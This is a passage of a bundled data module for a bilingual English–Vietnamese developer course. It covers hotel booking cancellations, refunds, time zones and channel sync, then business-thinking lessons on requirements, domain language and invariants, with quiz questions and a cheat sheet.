VI: **Chính sách hủy** quy định khách được hoàn bao nhiêu tiền. Thường nó phụ thuộc vào việc khách hủy sớm hay muộn.`},{type:"diagram",text:`Example policy, check-in 20 Jun 14:00

booked     18 Jun 14:00    20 Jun 14:00
  │             │               │
  ├─── free ────┼── 1 night ────┼─ no-show
  │ full refund │ fee charged   │ rule
                ▲
        48 hours before check-in`},{type:"text",text:`Some rates take a **deposit** now and the rest at the hotel. Others are prepaid in full. A **non-refundable** rate is cheaper but gives no money back.
VI: Có loại giá thu **tiền đặt cọc** trước, phần còn lại trả tại khách sạn. Có loại trả trước toàn bộ. Giá **không hoàn tiền** thì rẻ hơn nhưng hủy là mất tiền.`},{type:"example",title:"A partial refund",text:`A guest paid 5,500,000 for 3 nights. The first night costs 1,500,000. The guest cancels 30 hours before check-in, so one night is charged. Refund = 5,500,000 − 1,500,000 = 4,000,000.
VI: Khách đã trả 5.500.000 cho 3 đêm. Đêm đầu giá 1.500.000. Khách hủy trước giờ nhận phòng 30 tiếng nên bị tính phí một đêm. Hoàn lại = 5.500.000 − 1.500.000 = 4.000.000.`},{type:"diagram",text:`Held ─pay─► Confirmed ─arrive─► CheckedIn
 │           │      │              │
 │ timeout   │cancel│ no-show      │ leave
 ▼           ▼      ▼              ▼
Expired  Cancelled  NoShow     CheckedOut`},{type:"text",text:`A **refund** is a new record linked to the payment. Never edit or delete the original payment. A refund can be pending, done or failed.
VI: **Hoàn tiền** là một bản ghi mới gắn với khoản thanh toán. Không bao giờ sửa hay xóa khoản thanh toán gốc. Hoàn tiền có thể đang chờ, đã xong hoặc thất bại.`},{type:"text",text:`**Modify = cancel + rebook?** Not in that order. If you cancel first and the new dates are full, the guest loses both. Hold the new dates first, then swap.
VI: **Đổi ngày = hủy + đặt lại?** Không theo thứ tự đó. Nếu hủy trước mà ngày mới đã hết phòng, khách mất cả hai. Hãy giữ chỗ cho ngày mới trước, rồi mới đổi.`},{type:"code",code:{lang:"text",text:`Booking(Id, Status, PaidAmount,
  FreeCancelUntil,  -- copied at booking
  PenaltyNights, NonRefundable)
Refund(Id, BookingId, PaymentId,
  Amount, Status, CreatedAt)
  -- Status: Pending / Done / Failed`}},{type:"list",items:[`Which night is the "1 night" fee: the first night or the cheapest?
VI: Phí "1 đêm" tính theo đêm đầu tiên hay đêm rẻ nhất?`,`Does a date change count as a cancellation? Old price or today's price?
VI: Đổi ngày có bị tính là hủy không? Giữ giá cũ hay theo giá hôm nay?`,`Is the deposit refundable? Who approves a refund outside the policy?
VI: Tiền cọc có được hoàn không? Ai duyệt hoàn tiền ngoài chính sách?`]}],remember:`Copy the policy onto the booking, record refunds as new rows, and never cancel before the new dates are safe.
VI: Sao chép chính sách vào lượt đặt, ghi hoàn tiền thành dòng mới, và không bao giờ hủy trước khi giữ được ngày mới.`,questions:[{id:"booking.cancellations.1",kind:"mcq",difficulty:"medium",prompt:`A guest paid 4,500,000 for 3 nights at 1,500,000 each. Cancelling is free until 48 hours before. After that, 1 night is charged. The guest cancels 24 hours before. What is the refund?
VI: Khách trả 4.500.000 cho 3 đêm, mỗi đêm 1.500.000. Hủy miễn phí đến trước 48 tiếng, sau đó tính phí 1 đêm. Khách hủy trước 24 tiếng. Hoàn lại bao nhiêu?`,choices:["0","1,500,000","3,000,000","4,500,000"],answer:2,why:`24 hours is inside the 48-hour window, so one night is charged. 4,500,000 − 1,500,000 = 3,000,000.
VI: 24 tiếng nằm trong khoảng 48 tiếng nên bị tính phí một đêm. 4.500.000 − 1.500.000 = 3.000.000.`},{id:"booking.cancellations.2",kind:"scenario",difficulty:"hard",prompt:`"Change dates" is coded as: cancel the old booking, then create a new one. The new dates are full. What happens, and what is better?
VI: Chức năng "đổi ngày" được code là: hủy lượt đặt cũ rồi tạo lượt mới. Ngày mới đã hết phòng. Chuyện gì xảy ra, và cách nào tốt hơn?`,choices:["Nothing bad: the system rebooks the old dates","Guest loses both; hold the new dates, then swap","Guest keeps both; the hotel merges them later","Guest loses both; it is fine, they can call us"],answer:1,why:`The old room is already released and may be sold. Hold the new dates first, then cancel the old ones in the same transaction.
VI: Phòng cũ đã được nhả ra và có thể bị bán mất. Hãy giữ chỗ ngày mới trước, rồi hủy ngày cũ trong cùng một giao dịch.`},{id:"booking.cancellations.3",kind:"debug",difficulty:"medium",prompt:`Last week the hotel changed free cancellation from 48 to 72 hours. A guest who booked a month ago cancels 60 hours before and is charged. Why?
VI: Tuần trước khách sạn đổi hủy miễn phí từ 48 lên 72 tiếng. Một khách đặt từ tháng trước hủy trước 60 tiếng thì bị tính phí. Vì sao?`,choices:["The code reads today's policy, not the booked one","The guest's time zone moved the deadline by a day","The 60 hours were counted from the booking date","The refund failed, so the system kept the money"],answer:0,why:`The guest agreed to the 48-hour policy. Those terms must be copied onto the booking and used later.
VI: Khách đã đồng ý với chính sách 48 tiếng. Điều khoản đó phải được sao chép vào lượt đặt và dùng về sau.`},{id:"booking.cancellations.4",kind:"truefalse",difficulty:"easy",prompt:`When a guest gets a refund, the system should delete the original payment.
VI: Khi khách được hoàn tiền, hệ thống nên xóa khoản thanh toán gốc.`,choices:["True","False"],answer:1,why:`The payment really happened. Keep it, and add a refund record linked to it. Then accounting and bank statements still match.
VI: Khoản thanh toán đã thực sự xảy ra. Giữ nguyên nó và thêm bản ghi hoàn tiền gắn với nó. Như vậy kế toán và sao kê ngân hàng vẫn khớp.`}]},{id:"booking.time-zones",title:"Time zones and dates · Múi giờ và ngày",summary:`The hotel's clock decides, not the user's phone.
VI: Đồng hồ của khách sạn quyết định, không phải điện thoại của khách.`,minutes:4,blocks:[{type:"text",text:`A booking has two clocks: the **hotel's local time** and the **user's time**. Check-in times and cancel deadlines follow the hotel's place.
VI: Một lượt đặt có hai đồng hồ: **giờ địa phương của khách sạn** và **giờ của khách**. Giờ nhận phòng và hạn hủy tính theo nơi đặt khách sạn.`},{type:"diagram",text:`Same moment, three clocks
UTC        06:00
Tokyo      15:00 (UTC+9)  hotel check-in
Hanoi      13:00 (UTC+7)  user's phone`},{type:"example",title:"A trip to Tokyo",text:`A user in Hanoi books a Tokyo hotel. Check-in is 15:00 Tokyo time, which is 13:00 in Hanoi. "Free cancel until 48 hours before" counts from Tokyo time.
VI: Một khách ở Hà Nội đặt khách sạn ở Tokyo. Giờ nhận phòng là 15:00 giờ Tokyo, tức 13:00 giờ Hà Nội. "Hủy miễn phí đến trước 48 tiếng" tính theo giờ Tokyo.`},{type:"text",text:"A stay date is a **calendar date**, not a moment. Store `CheckIn` as a date only: `2026-06-14`. A UTC midnight can show as the day before in another time zone.\nVI: Ngày lưu trú là **ngày trên lịch**, không phải một thời điểm. Lưu `CheckIn` chỉ là ngày: `2026-06-14`. Nửa đêm UTC có thể hiện thành ngày hôm trước ở múi giờ khác."},{type:"code",code:{lang:"ts",text:`// A date-only string is read as UTC midnight
const d = new Date('2026-06-14');
d.toLocaleDateString('en-US',
  { timeZone: 'America/New_York' });
// → "6/13/2026"  one day earlier!`}},{type:"text",text:`Some countries move their clocks for **daylight saving time** (DST). Vietnam does not. In New York, one day in March has only 23 hours. So "add 24 hours" is not always "next day".
VI: Một số nước chỉnh đồng hồ theo **giờ mùa hè** (DST). Việt Nam không áp dụng. Ở New York, có một ngày trong tháng Ba chỉ dài 23 tiếng. Nên "cộng 24 tiếng" không phải lúc nào cũng là "ngày hôm sau".`},{type:"text",text:`"Today" depends on the place. Use the hotel's today for same-day booking and for the no-show cut-off. Do not use the server's clock.
VI: "Hôm nay" phụ thuộc vào nơi chốn. Dùng ngày hôm nay của khách sạn cho đặt phòng trong ngày và mốc tính no-show. Đừng dùng đồng hồ của server.`},{type:"code",code:{lang:"text",text:`Hotel(Id, TimeZone)  -- 'Asia/Tokyo'
Booking(CheckIn date, CheckOut date)
ClinicSlot(DoctorId,
  StartsAt datetimeoffset)  -- a moment
CancelDeadline: hotel local time → UTC`}}],remember:`Hotel nights are dates in the hotel's time zone. Clinic slots are real moments. Store each in the right type.
VI: Đêm lưu trú là ngày theo múi giờ khách sạn. Khung giờ khám là thời điểm thực. Hãy lưu mỗi loại bằng kiểu dữ liệu phù hợp.`,questions:[{id:"booking.time-zones.1",kind:"code",difficulty:"medium",prompt:`A user in New York opens a booking with check-in 14 June. What does this code show?
VI: Một khách ở New York mở lượt đặt có ngày nhận phòng 14/6. Đoạn code này hiện ra gì?`,code:{lang:"ts",text:`const d = new Date('2026-06-14');
d.toLocaleDateString('en-US',
  { timeZone: 'America/New_York' });`},choices:["6/14/2026","6/13/2026","6/15/2026","Invalid Date"],answer:1,why:`A date-only string is parsed as UTC midnight. In New York that moment is still 13 June, at 20:00.
VI: Chuỗi chỉ có ngày được hiểu là nửa đêm UTC. Ở New York, thời điểm đó vẫn là 20:00 ngày 13/6.`},{id:"booking.time-zones.2",kind:"compare",difficulty:"medium",prompt:`How should you store the check-in of a hotel stay?
VI: Nên lưu ngày nhận phòng của kỳ lưu trú như thế nào?`,choices:["As a date only: `2026-06-14`\nVI: Chỉ lưu ngày: `2026-06-14`","As a UTC moment: `2026-06-14T00:00Z`\nVI: Lưu thời điểm UTC: `2026-06-14T00:00Z`"],answer:0,why:`A night is a calendar date at the hotel. A UTC moment can turn into a different date when shown in another time zone.
VI: Một đêm lưu trú là ngày trên lịch tại khách sạn. Thời điểm UTC có thể thành ngày khác khi hiển thị ở múi giờ khác.`},{id:"booking.time-zones.3",kind:"debug",difficulty:"hard",prompt:`A hotel is in New York. The server runs in UTC. In summer, from 20:00 to midnight local time, guests cannot book for tonight. Why?
VI: Khách sạn ở New York, server chạy giờ UTC. Vào mùa hè, từ 20:00 đến nửa đêm giờ địa phương, khách không đặt được phòng cho đêm nay. Vì sao?`,choices:['Server "today" is UTC, already tomorrow there',"The hotel closes same-day booking at 20:00","DST makes those four hours not exist at all","The browser sends the date in the wrong format"],answer:0,why:`New York is UTC−4 in summer. At 20:00 there it is already 00:00 the next day in UTC. So "tonight" looks like a past date to the server.
VI: Mùa hè New York là UTC−4. Lúc 20:00 ở đó thì UTC đã sang 00:00 ngày hôm sau. Nên với server, "đêm nay" là một ngày đã qua.`},{id:"booking.time-zones.4",kind:"truefalse",difficulty:"medium",prompt:`In every country, every calendar day has exactly 24 hours.
VI: Ở mọi quốc gia, mọi ngày trên lịch đều dài đúng 24 tiếng.`,choices:["True","False"],answer:1,why:`In countries with DST, one day in spring has 23 hours and one day in autumn has 25. Use date types for date math.
VI: Ở các nước có DST, một ngày mùa xuân chỉ có 23 tiếng và một ngày mùa thu có 25 tiếng. Hãy dùng kiểu ngày cho phép tính ngày.`}]},{id:"booking.channels",title:"Channels and sync · Kênh bán và đồng bộ",summary:`One room, many shops: keep them in sync.
VI: Một phòng, nhiều nơi bán: phải giữ chúng đồng bộ.`,minutes:5,blocks:[{type:"text",text:`Hotels sell on their own website and on **OTAs** (online travel agencies), for example Booking.com or Agoda. Each place is a **channel**. OTAs usually take a commission.
VI: Khách sạn bán phòng trên website riêng và trên các **OTA** (đại lý du lịch trực tuyến), ví dụ Booking.com hay Agoda. Mỗi nơi bán là một **kênh**. OTA thường thu hoa hồng.`},{type:"diagram",text:`      ┌─────────────────────┐
      │ PMS (hotel system)  │
      │ rooms, rates, stock │
      └──────────┬──────────┘
                 │
      ┌──────────▼──────────┐
      │   Channel manager   │
      └──┬───────┬───────┬──┘
         ▼       ▼       ▼
    Website  Booking.com  Agoda

 down: rates and stock
 up:   new bookings, changes, cancels`},{type:"text",text:`The **PMS** (property management system) is the hotel's main software. The **channel manager** sends stock and rates to every channel. It also brings bookings back.
VI: **PMS** là phần mềm quản lý khách sạn chính. **Channel manager** đẩy số phòng trống và giá lên mọi kênh. Nó cũng kéo các lượt đặt về PMS.`},{type:"diagram",text:`10:00:00  Agoda sells the last room
10:00:01  PMS: stock 1 → 0
10:00:03  Booking.com guest books ✗
10:00:05  push "0 left" to Booking.com
=> 2 bookings, 1 room`},{type:"text",text:`Updates take time, so a sync delay can cause overbooking. **Rate parity** means the same room has the same price on every channel. Some OTA contracts ask for it.
VI: Cập nhật cần thời gian, nên độ trễ đồng bộ có thể gây bán vượt. **Rate parity** (đồng giá) là cùng một phòng có cùng giá trên mọi kênh. Một số hợp đồng với OTA yêu cầu điều này.`},{type:"text",text:`Messages can arrive twice or late. An **idempotent** update gives the same result if it runs twice. Send the full value, not a change.
VI: Tin nhắn có thể đến hai lần hoặc đến muộn. Cập nhật **idempotent** cho cùng kết quả dù chạy hai lần. Hãy gửi giá trị đầy đủ, không gửi phần thay đổi.`},{type:"code",code:{lang:"ts",text:`// Not idempotent: a retry removes 2 rooms
send({ roomType: 5, date, change: -1 });
// Idempotent: a retry sends the same value
send({ roomType: 5, date, available: 3 });`}},{type:"code",code:{lang:"sql",text:`-- Same OTA booking sent twice → saved once
CREATE UNIQUE INDEX UX_Booking_Channel
  ON Booking (ChannelId, ChannelRef);`}},{type:"example",title:"Keep one room back",text:`A small hotel has 20 rooms of one type. It shows only 19 on OTAs. The last room sells only on its own website or at the desk. Sync delays now rarely cause a double booking.
VI: Một khách sạn nhỏ có 20 phòng cùng loại. Họ chỉ mở 19 phòng trên OTA. Phòng cuối chỉ bán trên website riêng hoặc tại quầy. Nhờ vậy độ trễ đồng bộ hiếm khi gây đặt trùng.`}],remember:`Every channel sells the same rooms. Send full values, store each channel's booking id once, and plan for sync delays.
VI: Mọi kênh đều bán cùng một kho phòng. Gửi giá trị đầy đủ, lưu mã đặt phòng của từng kênh một lần, và tính trước độ trễ đồng bộ.`,questions:[{id:"booking.channels.1",kind:"mcq",difficulty:"easy",prompt:`What is the main job of a channel manager?
VI: Nhiệm vụ chính của channel manager là gì?`,choices:["Keep stock and rates in sync on all sales channels","Take guest payments and send them to the bank","Assign real room numbers to guests at check-in","Write reviews of the hotel on each travel site"],answer:0,why:`It connects the PMS to every channel. It sends stock and rates out and brings bookings in.
VI: Nó kết nối PMS với mọi kênh bán. Nó đẩy số phòng và giá ra ngoài, và kéo các lượt đặt về.`},{id:"booking.channels.2",kind:"debug",difficulty:"medium",prompt:`After a network timeout, the same Agoda booking appears twice in the PMS. What is the most likely cause?
VI: Sau một lần mạng bị timeout, cùng một lượt đặt từ Agoda xuất hiện hai lần trong PMS. Nguyên nhân khả năng cao nhất là gì?`,choices:["Agoda really sold the room twice to one guest","The PMS clock and the Agoda clock are not in sync","The channel manager sent the stock as a change","The retry was saved again; nothing checks ChannelRef"],answer:3,why:'A timeout often means "maybe it worked", so the sender retries. A unique index on `(ChannelId, ChannelRef)` makes the second save fail safely.\nVI: Timeout thường có nghĩa là "có thể đã thành công", nên bên gửi gửi lại. Unique index trên `(ChannelId, ChannelRef)` làm lần lưu thứ hai bị chặn an toàn.'},{id:"booking.channels.3",kind:"compare",difficulty:"medium",prompt:`How should the PMS send stock updates to a channel?
VI: PMS nên gửi cập nhật số phòng trống lên kênh bán như thế nào?`,choices:[`Send "sold 1 more" each time a room sells
VI: Gửi "bán thêm 1" mỗi khi bán được một phòng`,`Send "available = 3" for that type and date
VI: Gửi "còn trống = 3" cho loại phòng và ngày đó`],answer:1,why:`A full value is safe to repeat: sending "3" twice still means 3. Sending "−1" twice removes two rooms.
VI: Giá trị đầy đủ thì gửi lại vẫn an toàn: gửi "3" hai lần vẫn là 3. Gửi "−1" hai lần sẽ trừ mất hai phòng.`},{id:"booking.channels.4",kind:"scenario",difficulty:"hard",prompt:`The last room sold on two channels within 3 seconds. The manager asks IT to "make it never happen again". What is the honest answer?
VI: Phòng cuối bị bán trên hai kênh trong vòng 3 giây. Quản lý yêu cầu IT "làm sao để không bao giờ xảy ra nữa". Câu trả lời trung thực là gì?`,choices:["Sync faster, and the problem will be gone forever","Stop selling on OTAs and use only our own website","Delays cannot be zero; keep a buffer and a process","Make staff approve each OTA booking by hand first"],answer:2,why:`Channels are separate systems, so some delay always exists. A small buffer makes it rare. A clear process handles the rare case.
VI: Các kênh là những hệ thống riêng nên luôn có độ trễ. Giữ lại vài phòng giúp chuyện này hiếm xảy ra. Một quy trình rõ ràng sẽ xử lý trường hợp hiếm đó.`}]}],cheatSheet:[{title:"Time and stock · Thời gian và chỗ trống",items:[{term:"Night · Đêm lưu trú",meaning:`Nights = check-out date − check-in date.
VI: Số đêm = ngày trả phòng − ngày nhận phòng.`},{term:"[start, end) · Khoảng nửa mở",meaning:`Start is included, end is not; back-to-back is OK.
VI: Tính ngày đầu, không tính ngày cuối; hai lượt liền nhau không trùng.`},{term:"Overlap · Trùng lịch",meaning:"`a.start < b.end && b.start < a.end`.\nVI: Hai khoảng trùng khi `a.start < b.end && b.start < a.end`."},{term:"Hold · Giữ chỗ",meaning:`Blocks a unit during payment; always has an expiry.
VI: Khóa chỗ trong lúc thanh toán; luôn có thời hạn.`},{term:"Double booking · Đặt trùng",meaning:`Two bookings for one unit, often from a race condition.
VI: Hai lượt đặt cho một chỗ, thường do tranh chấp đồng thời.`},{term:"Overbooking · Bán vượt",meaning:`Selling above capacity on purpose; store the limit as data.
VI: Cố ý bán vượt sức chứa; lưu mức giới hạn thành dữ liệu.`},{term:"No-show · Khách không đến",meaning:`A guest who booked but never came.
VI: Khách đã đặt nhưng không đến.`}]},{title:"Money · Tiền",items:[{term:"Daily rate · Giá theo đêm",meaning:`Each night has its own price; the stay is the sum.
VI: Mỗi đêm có giá riêng; giá kỳ ở là tổng các đêm.`},{term:"Price lock · Chốt giá",meaning:`Copy nightly prices onto the booking when it is made.
VI: Sao chép giá từng đêm vào lượt đặt ngay lúc đặt.`},{term:"Deposit · Tiền đặt cọc",meaning:`Part paid now, the rest later.
VI: Trả trước một phần, phần còn lại trả sau.`},{term:"Non-refundable · Không hoàn tiền",meaning:`Cheaper rate; no money back on cancel.
VI: Giá rẻ hơn; hủy thì không được hoàn tiền.`},{term:"Cancellation policy · Chính sách hủy",meaning:`Fee by how early the guest cancels; copy it onto the booking.
VI: Phí tùy theo khách hủy sớm hay muộn; sao chép vào lượt đặt.`},{term:"Refund · Hoàn tiền",meaning:`A new record linked to the payment; never delete the payment.
VI: Bản ghi mới gắn với khoản thanh toán; không xóa khoản thanh toán.`}]},{title:"Booking statuses · Trạng thái lượt đặt",items:[{term:"Held · Đang giữ",meaning:`Waiting for payment until the hold expires.
VI: Đang chờ thanh toán cho đến khi hết hạn giữ chỗ.`},{term:"Expired · Hết hạn",meaning:`Hold ended without payment; the unit is free again.
VI: Hết thời gian giữ mà chưa trả tiền; chỗ được mở bán lại.`},{term:"Confirmed · Đã xác nhận",meaning:`Paid or guaranteed; the unit is taken.
VI: Đã trả tiền hoặc được bảo đảm; chỗ đã bị chiếm.`},{term:"Cancelled · Đã hủy",meaning:`Guest or hotel cancelled; the policy decides the refund.
VI: Khách hoặc khách sạn hủy; chính sách quyết định số tiền hoàn.`},{term:"NoShow · Không đến",meaning:`Guest did not arrive; a no-show fee may apply.
VI: Khách không đến; có thể bị tính phí no-show.`},{term:"CheckedIn / CheckedOut",meaning:`Guest is staying / guest has left.
VI: Khách đang ở / khách đã trả phòng.`}]},{title:"Time zones and channels · Múi giờ và kênh bán",items:[{term:"Hotel time zone · Múi giờ khách sạn",meaning:`Check-in times, deadlines and "today" use it.
VI: Giờ nhận phòng, hạn hủy và "hôm nay" đều theo múi giờ này.`},{term:"Date-only · Chỉ lưu ngày",meaning:`Store stay dates as dates, not UTC midnight.
VI: Lưu ngày lưu trú là ngày, không lưu nửa đêm UTC.`},{term:"DST · Giờ mùa hè",meaning:`Some days have 23 or 25 hours in some countries.
VI: Ở một số nước có ngày dài 23 hoặc 25 tiếng.`},{term:"OTA · Đại lý du lịch trực tuyến",meaning:`Online sales channel, for example Booking.com or Agoda.
VI: Kênh bán trực tuyến, ví dụ Booking.com hoặc Agoda.`},{term:"Channel manager",meaning:`Syncs stock and rates to all channels, brings bookings back.
VI: Đồng bộ số phòng và giá lên mọi kênh, kéo lượt đặt về.`},{term:"Rate parity · Đồng giá",meaning:`Same room, same price on every channel.
VI: Cùng một phòng, cùng một giá trên mọi kênh.`},{term:"Idempotent update",meaning:`Safe to repeat: send "available = 3", not "−1".
VI: Gửi lại vẫn an toàn: gửi "còn 3", không gửi "−1".`}]}]},y=Object.freeze(Object.defineProperty({__proto__:null,default:g},Symbol.toStringTag,{value:"Module"})),f={id:"business",title:"Business Thinking",emoji:"🧩",tagline:"Understand the problem before the code",lessons:[{id:"business.ask-why",title:'Ask "Why?" before "How?"',summary:"A request is a solution. Find the problem behind it.",minutes:3,blocks:[{type:"text",text:`Requests usually arrive as a **solution**: "Add an Export to Excel button."
Behind every solution is a **problem**. If you know the problem, you can build something simpler, or something that actually helps.`},{type:"diagram",text:`Request (a solution)  "Add an Excel export"
        ↓ why?
Goal                  "My boss checks weekly sales"
        ↓ why?
Real need             "Know early if we miss target"
        ↓
Options: export? dashboard? weekly email? alert?`},{type:"example",title:"The Excel button",text:"Maybe the Excel export is still the right answer. But now you know **who** reads it and **why**, so you can choose the right columns, filters and format."},{type:"list",items:["What problem does this solve?","Who uses it, and how often?","What do they do today without it?","How will we know it worked?"]},{type:"text",text:`Asking why is not refusing work. Say it kindly: "Help me understand the goal, so I build the right thing."
And know when to stop: some answers are **hard constraints** (a law, a contract). Then you stop asking why and ask for the **exact rule**.`}],remember:"A request is a solution. Find the problem behind it.",questions:[{id:"business.ask-why.1",kind:"scenario",difficulty:"easy",prompt:`The product owner (PO) asks: "Add a field so admins can set any order’s status by hand."
What is the best first question?`,choices:['"Should it be a dropdown or a text box?"','"What situation makes admins need this today?"','"Can we finish it in one day?"','"Which role should see the button?"'],answer:1,why:'Setting any status by hand can skip payment or stock steps. If the real problem is "orders get stuck", a safer fix like "retry stuck order" may be better.'},{id:"business.ask-why.2",kind:"scenario",difficulty:"medium",prompt:'Support asks for a "resend invoice email" button. You ask why. They say many customers never get the invoice, and most of those emails land in spam. What does this tell you?',choices:["Build the button exactly as asked and close the ticket","Support is wrong; the emails are delivered fine","Stop sending invoice emails completely","The real problem is email delivery; a download link may help more"],answer:3,why:"Sending the email again does not help if it goes to spam again. Knowing the cause lets you fix email delivery, or give customers another way to get the invoice. The button may still be useful, but it is not the main fix.",remember:"Fix the cause, not only the symptom."},{id:"business.ask-why.3",kind:"mcq",difficulty:"hard",prompt:'A manager says: "Make the dashboard real-time." Which question best finds the real need?',choices:['"Which WebSocket library should we use for the live updates?"','"Is a refresh every second real-time enough for you?"','"When a number changes, what do you do, and how fast?"','"Should we also build a mobile app with push notifications?"'],answer:2,why:"If the manager looks once an hour, refreshing every 5 minutes is enough. It is also much cheaper than true real-time. The decision they make sets the speed you need."},{id:"business.ask-why.4",kind:"scenario",difficulty:"hard",prompt:'A stakeholder (a person who owns or uses the feature) says: "Invoices must keep their number forever, even if cancelled. It is a tax rule." You do not see why. What should you do?',choices:["Keep asking why until you agree with the rule","Treat it as a hard constraint, and ask for the exact rule","Ignore it — deleting cancelled invoices is cleaner","Build it, but delete old invoices in a nightly job"],answer:1,why:"Some whys end at a law or a contract. You do not need to agree with the rule. But you need the exact details to build it correctly: which countries, and how long to keep the invoices.",remember:'When "why" ends at a law, ask for the exact rule.'}]},{id:"business.language",title:"Speak the domain language",summary:"Same word, same meaning — in meetings and in code.",minutes:3,blocks:[{type:"text",text:'Every business area (its **domain**) has its own words: "order", "customer", "active", "closed". The problem: the **same word often means different things** to different people.'},{type:"example",title:'What is an "active user"?',text:`Marketing: logged in during the last 30 days.
Billing: has a paid plan.
Support: account is not blocked.
A dashboard that says "Active users: 12,400" means nothing until you know which one.`},{type:"text",text:'Fix: agree on one meaning, and **use the same word in the code**. If the business says "Booking", do not call the class `Reservation` and the table `Slot`. Domain-Driven Design (DDD) calls this the **ubiquitous language**. "Ubiquitous" means "found everywhere": one set of words, used by people and in code.'},{type:"code",code:{lang:"csharp",text:`// Hard to follow: whose words are these?
if (u.Flag2 && u.Days < 3) Notify(u);

// Uses the words the business uses
if (customer.IsOnTrial && customer.TrialDaysLeft < 3)
    SendTrialEndingReminder(customer);`}},{type:"list",items:["Keep a small **glossary** (a list of terms): term, meaning, example, who owns it.",'When a word is unclear, ask: "When you say X, do you mean A or B?"','Watch out for words like "date", "closed", "total" — they hide many meanings.']}],remember:"Agree on what a word means, then use that exact word in code.",questions:[{id:"business.language.1",kind:"debug",difficulty:"medium",prompt:'Two reports show a different "number of customers": 8,200 and 11,500. Both SQL queries run without errors. What is the most likely cause?',choices:["The database is corrupted",'They use different meanings of "customer"',"One report runs on a slower server","One of the reports is cached for too long"],answer:1,why:'One query may count everyone who registered, the other only people who ordered. Both are "correct" — for different definitions. Agree on one and name it clearly.'},{id:"business.language.2",kind:"mcq",difficulty:"easy",prompt:'The business says "Booking". The code says `Reservation`, the API says `Appointment` and the table is `Slot`. What is the main cost?',choices:["Every talk needs translation, and confusion becomes bugs","The app gets slower, because it maps between the four names","The database needs extra joins to link the different tables","No real cost, as long as each layer is consistent inside"],answer:0,why:'People must translate between four names all the time. New developers get lost, and a requirement about "bookings" may be built in the wrong place.'},{id:"business.language.3",kind:"scenario",difficulty:"medium",prompt:'The requirement says: "Close the account when the user asks." What should you clarify first?',choices:['"Should the Close button be red, and need a second click?"','"Should we use DELETE or POST for the close-account endpoint?"','"Should we send the user an email after the account is closed?"','"Does close mean deactivate it, or delete the data forever?"'],answer:3,why:'"Close" can mean two very different things. You can undo one of them. The other is permanent and may have legal rules. The rest of the design depends on this answer.',remember:"Unclear verbs (close, remove, cancel) hide big decisions."},{id:"business.language.4",kind:"code",difficulty:"hard",prompt:'The rule is: "Invoices are due 30 days after the invoice date." A developer writes this. What should you question?',code:{lang:"csharp",text:"invoice.DueDate = invoice.CreatedAt.AddDays(30);"},choices:["Whether `AddDays` should be `AddHours`",'Whether "invoice date" is the same as when the row was created',"Whether 30 should be a named constant","Whether `DateTime` is slower than `DateTimeOffset`"],answer:1,why:'`CreatedAt` is when the system saved the row. The "invoice date" is a business date. Someone can enter an invoice days later, or give it a different date on purpose. Mixing them gives wrong due dates.'}]},{id:"business.edge-cases",title:'Business edge cases: "What if…?"',summary:"Requirements describe the normal case. Real life adds surprises.",minutes:4,blocks:[{type:"text",text:'Requirements describe the **happy path**: the normal case where everything goes right. Real life adds "what if…". Your job is to find those questions **before** users find them in production.'},{type:"example",title:'"Users cannot edit a published scenario."',text:`Good questions to ask:
• What if it is **being processed** right now?
• Can they unpublish, edit, then publish again?
• Can an admin still edit it?
• Is fixing a typo in the title an "edit"?
• What happens to results made with the old version?`},{type:"list",items:["**In progress** — what if it is half done (processing, half paid)?","**At the same time** — what if two people do it at once?","**Late** — what if it happens 1 minute after the deadline?","**Reversed** — cancel, refund, undo — after part of it already happened?","**Money** — rounding, a discount bigger than the price, currency.","**People** — the user is deleted, changes role, or leaves the company."]},{type:"text",text:'Edge cases are often **business decisions**, not technical ones. Do not decide alone. Write the question, suggest an answer, and get a "yes" from the person who owns the rule.'},{type:"compare",left:{title:"Decide silently ⚠️",items:["Fast today","Surprise later","The rule is hidden in code"]},right:{title:"Ask and write it down ✅",items:["Small delay","Everyone agrees","Becomes a test case"]}}],remember:"For each rule ask: what if it is in progress, at the same time, late, or reversed?",questions:[{id:"business.edge-cases.1",kind:"scenario",difficulty:"medium",prompt:'Rule: "Users cannot edit a published scenario." Anna opens the edit page. While she types, a colleague publishes the scenario. Anna clicks Save. What should you do as the developer?',choices:["Allow the save — she started before it was published","Silently throw away her changes","Check the state on the server at save time, and ask the PO what Anna should see","Block publishing while anyone has the page open, without asking"],answer:2,why:"The server must check the rule when saving, not only when the page opens. What Anna sees (an error, a copy as draft…) is a business decision, so ask."},{id:"business.edge-cases.2",kind:"scenario",difficulty:"hard",prompt:`Rule: "Customers can cancel an order for a full refund before it ships."
An order has 3 items: 2 have shipped, 1 has not. The customer clicks Cancel. What is the best next step?`,choices:["Refund everything — the rule says full refund","Notice the rule does not cover this, and ask the business","Refuse — part of the order has already shipped","Ship the last item faster so the question goes away"],answer:1,why:'The rule does not cover a partial shipment. Options like "cancel and refund only the unshipped item" are business choices with money involved. Ask, then write the answer into the rule.',remember:"A rule that does not cover a case is a question, not a guess."},{id:"business.edge-cases.3",kind:"scenario",difficulty:"easy",prompt:'A new promo: "10 € off any order." A user orders a single item that costs 8 €. Which edge case must the business decide?',choices:["The order total could go below zero","The promo code might be typed in lowercase","The page might load a little slower","The user might not like the item"],answer:0,why:"Without a rule, the total becomes −2 €. Should the total stop at 0? Is there a minimum order value? That is a business decision, not a coding detail."},{id:"business.edge-cases.4",kind:"compare",difficulty:"medium",prompt:"On Friday afternoon you find an edge case the requirement does not cover. Which is better?",choices:["Choose a safe default, write the question down, and get the owner to confirm it","Choose a behavior and tell nobody — it is just a small detail"],answer:0,why:'Silent choices become hidden business rules that nobody agreed on. Writing the question down lets the business say "no, do it differently" before customers notice.'}]},{id:"business.invariants",title:"Invariants: rules that are always true",summary:"Protect them close to the data.",minutes:4,blocks:[{type:"text",text:"An **invariant** is a rule that must be true **at all times**. It does not matter which screen, API, job or script changed the data."},{type:"list",items:["An order’s total equals the sum of its lines.","A concert seat is booked by at most one person.","A transfer never creates or destroys money.","A published scenario has at least one step."]},{type:"text",text:"Sometimes the rule lives only in the UI. Then an API call, an import job or an admin script can break it. Put the rule **close to the data**."},{type:"diagram",text:`UI check       → nice for users, easy to skip
API validation → better, but jobs can skip it
Domain object  → every code path goes through it
DB constraint  → last protection (UNIQUE, CHECK, FK)`},{type:"code",code:{lang:"csharp",text:`public class Order
{
    private readonly List<OrderLine> _lines = new();
    public OrderStatus Status { get; private set; }
    public decimal Total { get; private set; }

    public void AddLine(OrderLine line)
    {
        if (Status != OrderStatus.Draft)
            throw new InvalidOperationException(
                "Only draft orders can change.");
        _lines.Add(line);
        Total = _lines.Sum(l => l.Price * l.Quantity);
    }
